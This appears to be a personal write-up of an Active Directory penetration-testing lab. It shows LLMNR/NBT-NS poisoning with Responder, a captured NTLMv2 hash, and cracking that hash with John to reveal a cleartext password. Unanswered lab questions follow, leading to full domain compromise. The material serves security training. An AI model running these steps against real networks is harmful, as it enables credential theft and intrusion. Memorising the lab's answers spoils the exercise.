---
created: 2026-10-06
updated: 2026-10-07
---
## Poisoning

- SSH:

```bash
ssh htb-student@10.129.131.37
```

- Get the interfaces:

```bash
ip a
```
```bash
# ...
3: ens224: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
    link/ether a2:de:ad:e8:5e:4d brd ff:ff:ff:ff:ff:ff
    altname enp19s0
    inet 172.16.7.240/23 brd 172.16.7.255 scope global noprefixroute ens224
       valid_lft forever preferred_lft forever
    inet6 fe80::2957:2d31:5225:229a/64 scope link noprefixroute 
       valid_lft forever preferred_lft forever
# ...
```

- Start `responder`:

```bash
sudo responder -I ens224 -A
```


- Captured hashes are stored in `/usr/share/responder/logs`:

```bash
cat SMB-NTLMv2-SSP-172.16.7.3.txt | head -n 2
```

```bash
AB920::INLANEFREIGHT:0c6498a2a4acd121:FC356D6ADC6D88DF90AC4AE7C5A81948:010100000000000080807217BC4DD80128BCE65BE5F2DD84000000000200080036004A004500310001001E00570049004E002D00500049004D003500300048005300500046004A00530004003400570049004E002D00500049004D003500300048005300500046004A0053002E0036004A00450031002E004C004F00430041004C000300140036004A00450031002E004C004F00430041004C000500140036004A00450031002E004C004F00430041004C000700080080807217BC4DD80106000400020000000800300030000000000000000000000000200000C2EF82380450C5C35E0A85FDD7EC2C1B4D7467DB93379E10636AA575B9984C570A0010000000000000000000000000000000000009002E0063006900660073002F0049004E004C0041004E0045004600520049004700480054002E004C004F00430041004C00000000000000000000000000
AB920::INLANEFREIGHT:0c6498a2a4acd121:FC356D6ADC6D88DF90AC4AE7C5A81948:010100000000000080807217BC4DD80128BCE65BE5F2DD84000000000200080036004A004500310001001E00570049004E002D00500049004D003500300048005300500046004A00530004003400570049004E002D00500049004D003500300048005300500046004A0053002E0036004A00450031002E004C004F00430041004C000300140036004A00450031002E004C004F00430041004C000500140036004A00450031002E004C004F00430041004C000700080080807217BC4DD80106000400020000000800300030000000000000000000000000200000C2EF82380450C5C35E0A85FDD7EC2C1B4D7467DB93379E10636AA575B9984C570A0010000000000000000000000000000000000009002E0063006900660073002F0049004E004C0041004E0045004600520049004700480054002E004C004F00430041004C00000000000000000000000000
```

- Crack the hash:

```bash
john --format=netntlmv2 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

```bash
Created directory: /home/htb-student/.john
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
weasal           (AB920)
1g 0:00:00:00 DONE (2026-10-07 09:45) 4.545g/s 1321Kp/s 1321Kc/s 1321KC/s winewine..tene
```


## Q&A

1. Obtain a password hash for a domain user account that can be leveraged to gain a foothold in the domain. What is the account name?
	- 
2. What is this user's cleartext password?
	- 
3. Submit the contents of the `C:\flag.txt` file on `MS01`.
	- 
4. Use a common method to obtain weak credentials for another user. Submit the username for the user whose credentials you obtain.
	- 
5. What is this user's password?
	- 
6. Locate a configuration file containing an MSSQL connection string. What is the password for the user listed in this file?
	- 
7. Submit the contents of the `flag.txt` file on the Administrator Desktop on the `SQL01` host.
	- 
8. Submit the contents of the `flag.txt` file on the Administrator Desktop on the `MS01` host.
	- 
9. Obtain credentials for a user who has `GenericAll` rights over the Domain Admins group. What's this user's account name?
	- 
10. Crack this user's password hash and submit the cleartext password as your answer.
	- 
11. Submit the contents of the `flag.txt` file on the Administrator desktop on the `DC01` host.
	- 
12. Submit the NTLM hash for the `KRBTGT` account for the target domain after achieving domain compromise.
	- 